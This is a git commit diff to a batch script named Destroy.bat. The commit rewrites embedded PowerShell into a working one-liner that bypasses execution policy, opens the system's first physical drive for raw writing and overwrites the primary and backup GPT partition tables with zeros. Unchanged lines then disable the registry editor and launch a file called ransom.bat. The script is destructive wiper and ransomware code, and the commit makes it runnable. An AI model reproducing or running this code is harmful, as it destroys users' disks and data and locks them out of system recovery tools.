46ecb88de9e237b17f89347edc3726e3c8819613
githubyoon <165875440+githubyoon@users.noreply.github.com>
2026-02-23 11:43:24 +0900

    Update Destroy.bat

--- Destroy.bat
+++ Destroy.bat
@@ -23,30 +23,16 @@ REM --> If error flag set, we do not have admin.
      CD /D "%~dp0"
  :--------------------------------------  
 
-try {
-    $disk = Get-PhysicalDisk | Where-Object { $_.DeviceId -eq 0 }
-    if (-not $disk) { throw "Disk 0 not found" }
-    $diskSizeBytes = $disk.Size
-
-    $drive = "\\.\PhysicalDrive0"
-    $fs = New-Object IO.FileStream($drive, [IO.FileMode]::Open, [IO.FileAccess]::ReadWrite, [IO.FileShare]::None)
-
-    # Primary GPT + Entries (섹터 1부터 넉넉히 20KB)
-    $fs.Position = 512
-    $fs.Write([byte[]](,0 * 20480), 0, 20480)
-
-    # Backup GPT + Entries (끝 -20KB 영역)
-    $backupSafeStart = $diskSizeBytes - 20480
-    if ($backupSafeStart -gt 0) {
-        $fs.Position = $backupSafeStart
-        $fs.Write([byte[]](,0 * 20480), 0, 20480)
-    }
-}
-catch {
-    Write-Host "Error: $($_.Exception.Message)" -ForegroundColor Red
-}
-finally {
-    if ($fs) { $fs.Dispose() }
-}
+powershell -ExecutionPolicy Bypass -Command ^
+    "$disk = Get-PhysicalDisk | Where-Object { $_.DeviceId -eq 0 }; " ^
+    "if (!$disk) { throw 'Disk 0 not found' }; " ^
+    "$diskSizeBytes = $disk.Size; " ^
+    "$drive = '\\.\PhysicalDrive0'; " ^
+    "$fs = New-Object IO.FileStream($drive, 'Open', 'ReadWrite', 'None'); " ^
+    "$fs.Position = 512; " ^
+    "$fs.Write([byte[]](,0 * 20480), 0, 20480); " ^
+    "$backupSafeStart = $diskSizeBytes - 20480; " ^
+    "if ($backupSafeStart -gt 0) { $fs.Position = $backupSafeStart; $fs.Write([byte[]](,0 * 20480), 0, 20480) }; " ^
+    "$fs.Dispose()"
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 1 /f
 start %localappdata%\ransom.bat
